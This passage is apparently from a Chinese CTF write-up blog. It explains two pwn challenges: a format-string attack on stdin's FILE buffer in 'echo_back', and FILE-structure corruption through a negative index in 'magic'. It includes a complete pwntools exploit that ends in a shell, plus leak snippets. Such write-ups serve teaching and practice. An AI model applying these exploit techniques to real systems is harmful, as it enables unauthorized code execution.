+<p>观察FILE地址：<code>0x7fb99cd198e0 &lt;_IO_2_1_stdin_&gt;</code> ，我们想到将<code>stdin-&gt;_IO_buf_base</code>低字节写成<code>\x00</code> ，这样我们可以控制从<code>0x7fb99cd19900</code> 到<code>0x7fb99cd19964</code> 的所有地址，而FILE结构的很多部分也就在这个范围内，包括<code>stdin-&gt;_IO_buf_base</code>与<code>stdin-&gt;_IO_buf_end</code>！这样我们便可以为所欲为了。但是我们怎么利用格式化字符串能写<code>stdin-&gt;_IO_buf_base</code>呢？这时想起了函数<code>name</code>，它写入的参数就<code>echo_back</code>中<code>a1</code>。所以我们在<code>a1</code>中输入<code>p64(stdin-&gt;_IO_buf_base)</code>，并在<code>echo_back</code>中键入格式化字符串修改，调试得<code>a1</code>对应位置为<code>%16$p</code> ，故输入<code>%16$hhn</code> 即可修改。动手试试，下图为修改结果</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/04/15/WNjBFmbAp5xQuHY.png"
+        data-srcset="https://i.loli.net/2020/04/15/WNjBFmbAp5xQuHY.png, https://i.loli.net/2020/04/15/WNjBFmbAp5xQuHY.png 1.5x, https://i.loli.net/2020/04/15/WNjBFmbAp5xQuHY.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/04/15/WNjBFmbAp5xQuHY.png"
+        title="20200414210129.png" /></p>
+<p>所以我们下次输入能从<code>0x7fb99cd19900 </code> 一直写到<code>0x7fb99cd19964 </code> ，也能再次通过覆盖而改变<code>stdin-&gt;_IO_buf_base</code>与<code>stdin-&gt;_IO_buf_end</code>，为避免错误保持前几项不变，为<code>_IO_2_1_stdin_+131</code> 。下面将<code>stdin-&gt;_IO_buf_base</code>与<code>stdin-&gt;_IO_buf_end</code>修改为我们想要写的main函数返回地址处</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/04/15/QE7DabcJR6NC4Wv.png"
+        data-srcset="https://i.loli.net/2020/04/15/QE7DabcJR6NC4Wv.png, https://i.loli.net/2020/04/15/QE7DabcJR6NC4Wv.png 1.5x, https://i.loli.net/2020/04/15/QE7DabcJR6NC4Wv.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/04/15/QE7DabcJR6NC4Wv.png"
+        title="20200414210206.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/04/15/Yc4jP6xVbWdoOER.png"
+        data-srcset="https://i.loli.net/2020/04/15/Yc4jP6xVbWdoOER.png, https://i.loli.net/2020/04/15/Yc4jP6xVbWdoOER.png 1.5x, https://i.loli.net/2020/04/15/Yc4jP6xVbWdoOER.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/04/15/Yc4jP6xVbWdoOER.png"
+        title="20200414210422.png" /></p>
+<p>改写成功！接下来我们只要再次执行到<code>echo_back</code> 中的<code>scanf()</code></p>
+<p>输入<code>p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</code> 就好了</p>
+<p>但我们还是高兴得太早了，仔细看上图<code>stdin-&gt;_IO_read_ptr</code>显然已经小于<code>stdin-&gt;_IO_read_end</code>了！！所以我们根本没办法写入数据。</p>
+<p>最后一个拦路虎通过<code>echo_back</code>中的<code>getchar()</code> 解决，<code>getchar()</code>会将<code>stdin-&gt;_IO_read_ptr</code>加一，所以再调用<code>echo_back</code> 几次（几十次，最终即可顺利读取并getshell。</p>
+<h3 id="exp">exp</h3>
+<p><code>ubuntu16.04</code>测试成功:-)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#! /usr/bin/env python</span>
+<span class="c1">#coding:utf8</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">local</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="k">if</span> <span class="n">local</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./echo_back&#39;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;111.198.29.45&#34;</span><span class="p">,</span> <span class="mi">38784</span><span class="p">)</span>
+
+<span class="n">debug</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./echo_back&#39;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+<span class="n">prdi</span> <span class="o">=</span> <span class="mh">0x0000000000000d93</span>
+<span class="n">main_P_addr</span> <span class="o">=</span> <span class="mh">0xc6c</span>
+<span class="n">IO_stdin</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdin_&#39;</span><span class="p">]</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">echo_back</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">con</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice&gt;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;length:&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">con</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">name</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice&gt;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;name:&#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">pause</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;pause&#39;</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">raw_input</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+
+<span class="c1"># 泄露libc基址</span>
+<span class="n">echo_back</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s1">&#39;%19$p&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
+<span class="n">libc_s_m_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">240</span>
+<span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_s_m_addr</span><span class="p">)</span>
+
+<span class="n">offset</span> <span class="o">=</span> <span class="n">libc_s_m_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">offset</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span> <span class="o">+</span> <span class="n">offset</span>
+<span class="n">IO_stdin_addr</span> <span class="o">=</span> <span class="n">IO_stdin</span> <span class="o">+</span> <span class="n">offset</span>
+<span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+<span class="c1"># 泄露elf基址</span>
+<span class="n">echo_back</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s1">&#39;%14$p&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
+<span class="n">elf_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xd30</span>
+<span class="n">prdi</span> <span class="o">=</span> <span class="n">prdi</span> <span class="o">+</span> <span class="n">elf_base</span>
+<span class="c1"># 泄露main返回地址</span>
+<span class="n">echo_back</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s1">&#39;%12$p&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
+<span class="n">main_ebp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">main_ret</span> <span class="o">=</span> <span class="n">main_ebp</span> <span class="o">+</span> <span class="mh">0x8</span>
+<span class="c1"># 修改IO_buf_base，增大输入字符数</span>
+<span class="n">IO_buf_base</span> <span class="o">=</span> <span class="n">IO_stdin_addr</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">*</span> <span class="mi">7</span>
+<span class="nb">print</span> <span class="s2">&#34;IO_buf_base:&#34;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">IO_buf_base</span><span class="p">)</span>
+<span class="n">name</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_buf_base</span><span class="p">))</span>
+<span class="n">echo_back</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s1">&#39;%16$hhn&#39;</span><span class="p">)</span>
+<span class="c1"># 输入payload，覆盖stdinFILE结构的关键参数</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">IO_stdin_addr</span> <span class="o">+</span> <span class="mi">131</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_ret</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="mh">0x8</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice&gt;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;length:&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="c1"># 绕过_IO_new_file_underflow中检测</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice&gt;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;length:&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+<span class="c1"># 实现指定位置写</span>
+<span class="n">pause</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice&gt;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;length:&#39;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+<span class="c1"># getshell</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;choice&gt;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="magic">magic</h2>
+<h3 id="checksec-1">checksec</h3>
+<p>64位程序，只开了<code>NX</code>与<code>Canary</code>，可以劫持<code>got</code>表</p>
+<h3 id="漏洞-1">漏洞</h3>
+<p>分析程序知<code>wizard</code>为一个结构体，先在ida中创建，便于后续分析</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/04/16/tLGv5OqzRI14orM.png"
+        data-srcset="https://i.loli.net/2020/04/16/tLGv5OqzRI14orM.png, https://i.loli.net/2020/04/16/tLGv5OqzRI14orM.png 1.5x, https://i.loli.net/2020/04/16/tLGv5OqzRI14orM.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/04/16/tLGv5OqzRI14orM.png"
+        title="https://i.loli.net/2020/04/16/tLGv5OqzRI14orM.png" /></p>
+<p>主要函数为<code>wizard_spell</code> ，存在负下标的漏洞，并且函数先后调用了<code>fwrite</code> 与<code>fread</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/04/16/vkJajKQziZ4oyAW.png"
+        data-srcset="https://i.loli.net/2020/04/16/vkJajKQziZ4oyAW.png, https://i.loli.net/2020/04/16/vkJajKQziZ4oyAW.png 1.5x, https://i.loli.net/2020/04/16/vkJajKQziZ4oyAW.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/04/16/vkJajKQziZ4oyAW.png"
+        title="https://i.loli.net/2020/04/16/vkJajKQziZ4oyAW.png" /></p>
+<p>同时我们发现，全局变量<code>log_file</code>与<code>wizards</code>数组离得很近，所以我们可以通过负下标控制<code>log_file</code> 指向的<code>FILE</code>内容</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/04/16/jELCoPgMWyGi5xK.png"
+        data-srcset="https://i.loli.net/2020/04/16/jELCoPgMWyGi5xK.png, https://i.loli.net/2020/04/16/jELCoPgMWyGi5xK.png 1.5x, https://i.loli.net/2020/04/16/jELCoPgMWyGi5xK.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/04/16/jELCoPgMWyGi5xK.png"
+        title="https://i.loli.net/2020/04/16/jELCoPgMWyGi5xK.png" /></p>
+<p>本题主要考察<code>fwrite</code>与<code>fread</code>的源码，读函数如<code>fread/scanf</code>等 都会调用<code>IO_underflow</code> ，写函数是<code>IO_overflow</code> ，与<code>FILE</code> 相关的操作都在里面。分析源码后某大佬得出结论（不是我</p>
+<blockquote>
+<p>在读操作中，我们只能修改写相关的指针，如<code>_IO_write_base/_IO_write_ptr</code> 等</p>
+<p>而在写操作中，我们只能修改读相关指针，如<code>_IO_read_base/_IO_read_ptr</code>等</p>
+</blockquote>
+<p>也就是说我们只能在<code>fwrite</code>中改写读的指针，在<code>fread</code>中改写写的指针。我们的思路是，修改<code>_IO_read_ptr</code>打印出<code>libc</code>基址，修改<code>_IO_write_ptr</code> 改写<code>atoi_got</code> 内容为<code>system</code> ，具体来说分为以下部分</p>
+<h3 id="修改_io_write_ptr">修改<code>_IO_write_ptr</code></h3>
+<p>我们发现<code>wizard-&gt;power</code>与<code>log_file-&gt;_IO_write_ptr</code>在各自结构体中的偏移相同，也就是说如果我们输入负下标<code>-2</code>，每次调用完<code>wizard_spell</code>后<code>log_file-&gt;_IO_write_ptr</code>就会减少50，很自然想到让其减少到<code>FILE</code>结构体，这样就可以任意修改<code>FILE</code>了。动手调试一下</p>
+<p>我们先初始化一个<code>wizard[0]</code> ，以初始化<code>FILE</code> 结构体，在<code>wizard_spell</code> 返回前断下。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/04/16/ghOtN9LTCxr8FmD.png"
+        data-srcset="https://i.loli.net/2020/04/16/ghOtN9LTCxr8FmD.png, https://i.loli.net/2020/04/16/ghOtN9LTCxr8FmD.png 1.5x, https://i.loli.net/2020/04/16/ghOtN9LTCxr8FmD.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/04/16/ghOtN9LTCxr8FmD.png"
+        title="https://i.loli.net/2020/04/16/ghOtN9LTCxr8FmD.png" /></p>
+<p>简单计算一下，<code>656=14*50-44</code> ，也就是至少调用14次<code>wizard_spell</code> ，然后在这14次中应该输入44个字符串，因为每次<code>_IO_write_ptr</code> 还会加上输入的字符串数。这里经过反复调试（因为FILE前后数据段有很多重要参数，我们每次都修改了某些参数，很容易使程序崩溃），最终得到了一个不会崩溃的输入序列</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">):</span>
+    <span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">11</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">11</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这时<code>_IO_write_ptr</code>位于<code>FILE</code>-1的位置，调试一下确实如此，可以输入数据覆盖<code>FILE</code> 结构了</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/04/16/wgWNuqx9bvKSVyn.png"
+        data-srcset="https://i.loli.net/2020/04/16/wgWNuqx9bvKSVyn.png, https://i.loli.net/2020/04/16/wgWNuqx9bvKSVyn.png 1.5x, https://i.loli.net/2020/04/16/wgWNuqx9bvKSVyn.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/04/16/wgWNuqx9bvKSVyn.png"
+        title="https://i.loli.net/2020/04/16/wgWNuqx9bvKSVyn.png" /></p>
+<h3 id="泄露libc与heap_base">泄露<code>libc</code>与<code>heap_base</code></h3>
+<p>紧接上文，我们可以将<code>FILE</code>的<code>_IO_read_ptr</code>的值修改为<code>atoi_got</code>，这样在下一次调用<code>wizard_spell</code> 时调用<code>fwrite</code> 会将<code>_IO_read_ptr</code>指向的值也就是<code>atoi</code> 的实际地址读入到<code>log_file</code> 中，然后通过<code>fread</code> 打印出来，泄露<code>libc</code> 。需要注意这里我们应该向<code>wizard[0]</code> 而不是<code>wizard[-2]</code>中输入payload，因为我们并不想让<code>_IO_write_ptr</code> 减少50。同时应该尽量保持其他<code>FILE</code> 数据不变。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># leak libc</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad24a8</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">atoi_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+<span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">atoi_addr</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>于是我们泄露了<code>libc</code> ，此时的<code>_IO_write_ptr</code>指向了<code>_IO_read_base</code> ，也即<code>FILE</code> +24偏移处，所以我们重新利用<code>wizard[-2]</code> 来使<code>_IO_write_ptr</code>指回<code>FILE</code> 首地址，继续修改<code>FILE</code> 来泄露<code>heap_base</code> ，而<code>log_file</code> 为<code>FILE</code>指针，内容即为堆上的地址，用它来泄露<code>heap_base</code> 。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># leak heap</span>
+<span class="n">spell</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad24a8</span><span class="p">))</span>
+<span class="n">spell</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">log_file</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">log_file</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">))</span>
+<span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x10</span>
+<span class="nb">print</span> <span class="s1">&#39;heap:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="修改atoi_got-表项">修改<code>atoi_got</code> 表项</h3>
+<p>紧接上文，我们现在的<code>_IO_write_ptr</code>指向了<code>_IO_read_base</code> 。我们下一步是想写<code>atoi_got</code> 表项为<code>system</code> ，就像上面一样很自然的思路当然是修改<code>_IO_write_ptr</code> 使其指向<code>atoi_got</code> ，但这是不行的。</p>
+<p>回想最开始的一句话，再重复一遍予以强调。</p>
+<blockquote>
+<p>在读操作中，我们只能修改写相关的指针，如<code>_IO_write_base/_IO_write_ptr</code> 等</p>
+<p>而在写操作中，我们只能修改读相关指针，如<code>_IO_read_base/_IO_read_ptr</code>等</p>
+</blockquote>
+<p>具体原因可以在源码中看到，当我们调用写函数并试图修改写指针，写操作完成后<code>_IO_write_ptr</code> 会再一次被覆盖，变回了原来的正常情况地址；读函数也类似。在上面的利用过程可以看到我们是利用<code>fwrite</code> 修改<code>_IO_read_ptr</code> ，所以才能成功泄露。也就是说，如果我们想改写<code>atoi_got</code> 表项，我们应该利用<code>fread</code> 改写<code>_IO_write_ptr</code> 。</p>
+<h4 id="源码分析">源码分析</h4>
+<p><font color=red> 这里我们解释一下为什么</font>，笔者说说自己的看法，当然如果耐心看看源码可能会有新的理解，下列代码节选自<code>_IO_new_file_xsputn</code> ，也即<code>fwrite</code> 核心实现函数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="o">...</span>
